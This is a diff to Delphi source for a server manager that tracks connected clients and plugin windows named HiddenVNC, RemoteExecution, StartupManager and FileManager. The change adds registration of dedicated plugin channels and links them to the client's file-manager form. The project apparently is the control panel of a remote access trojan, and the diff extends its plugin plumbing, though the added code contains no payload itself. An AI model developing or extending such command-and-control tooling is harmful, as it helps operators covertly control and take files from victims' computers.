@@ -85,6 +85,12 @@ type
     DirtyH   : Cardinal;
   end;
 
+  TChannelInfo = record
+    LineHandle : TncLine;
+    ClientID   : string;
+    PluginID   : string;
+  end;
+
   TClientInfo = record
     LineHandle   : TncLine;
     IPAddress    : string;
@@ -127,6 +133,7 @@ type
     FHiddenVNCForms       : TDictionary<TncLine, TForm10>;
     FRemoteExecutionForms : TDictionary<TncLine, TForm11>;
     FStartupManagerForms  : TDictionary<TncLine, TForm12>;
+    FChannels             : TDictionary<TncLine, TChannelInfo>;
     FReadBuffers          : TDictionary<TncLine, TBytes>;
     FSendLocks        : TDictionary<Pointer, TCriticalSection>;
     FHeartbeatTimer   : TTimer;
@@ -340,6 +347,7 @@ begin
   FHiddenVNCForms   := TDictionary<TncLine, TForm10>.Create;
   FRemoteExecutionForms := TDictionary<TncLine, TForm11>.Create;
   FStartupManagerForms  := TDictionary<TncLine, TForm12>.Create;
+  FChannels             := TDictionary<TncLine, TChannelInfo>.Create;
   FReadBuffers          := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -367,6 +375,7 @@ begin
   DetachRemoteExecutionForms;
   DetachStartupManagerForms;
   FReadBuffers.Free;
+  FChannels.Free;
   FRemoteExecutionForms.Free;
   FHiddenVNCForms.Free;
   FFileManagerForms.Free;
@@ -714,11 +723,29 @@ begin
 end;
 
 function TServerManager.GetFileManagerForm(aLine: TncLine): TForm9;
+var
+  ChanInfo: TChannelInfo;
+  Pair: TPair<TncLine, TForm9>;
+  CInfo: TClientInfo;
 begin
   FLock.Enter;
   try
-    if not FFileManagerForms.TryGetValue(aLine, Result) then
-      Result := nil;
+    if FFileManagerForms.TryGetValue(aLine, Result) then Exit;
+
+    { Check if aLine is a dedicated channel line }
+    if FChannels.TryGetValue(aLine, ChanInfo) then
+    begin
+      for Pair in FFileManagerForms do
+      begin
+        if TryGetClientInfo(Pair.Key, CInfo) and (CInfo.ID = ChanInfo.ClientID) then
+        begin
+          Result := Pair.Value;
+          Exit;
+        end;
+      end;
+    end;
+
+    Result := nil;
   finally
     FLock.Leave;
   end;
@@ -1280,6 +1307,7 @@ begin
     if FClients.TryGetValue(aLine, Info) then IP := Info.IPAddress;
 
     FClients.Remove(aLine);
+    FChannels.Remove(aLine);
     FReadBuffers.Remove(aLine);
     FInfoForms.Remove(aLine);
 
@@ -1741,6 +1769,51 @@ begin
     IP := '';
     if TryGetClientInfo(aLine, Info) then
       IP := Info.IPAddress;
+
+    { ---- Channel registration ---- }
+    if Action = 'register_channel' then
+    begin
+      var ChanInfo: TChannelInfo;
+      ChanInfo.LineHandle := aLine;
+      ChanInfo.ClientID   := '';
+      ChanInfo.PluginID   := '';
+      if Assigned(JSONObj.Values['client_id']) then
+        ChanInfo.ClientID := JSONObj.Values['client_id'].Value;
+      if Assigned(JSONObj.Values['plugin_id']) then
+        ChanInfo.PluginID := JSONObj.Values['plugin_id'].Value;
+
+      FLock.Enter;
+      try
+        FChannels.AddOrSetValue(aLine, ChanInfo);
+      finally
+        FLock.Leave;
+      end;
+
+      DoLog(lcConnection, 'Channel registered for plugin "' + ChanInfo.PluginID + '" [Client: ' + ChanInfo.ClientID + ']');
+
+      { Associate channel line with FileManager form if matching }
+      if SameText(ChanInfo.PluginID, FILE_MANAGER_PLUGIN_ID) then
+      begin
+        FLock.Enter;
+        try
+          for var Pair in FClients do
+          begin
+            if Pair.Value.ID = ChanInfo.ClientID then
+            begin
+              var F9Form: TForm9 := nil;
+              if FFileManagerForms.TryGetValue(Pair.Key, F9Form) and Assigned(F9Form) then
+              begin
+                F9Form.SetChannelLine(aLine);
+              end;
+              Break;
+            end;
+          end;
+        finally
+          FLock.Leave;
+        end;
+      end;
+      Exit;
+    end;
 
     { ---- Pong ---- }
     if Action = 'pong' then
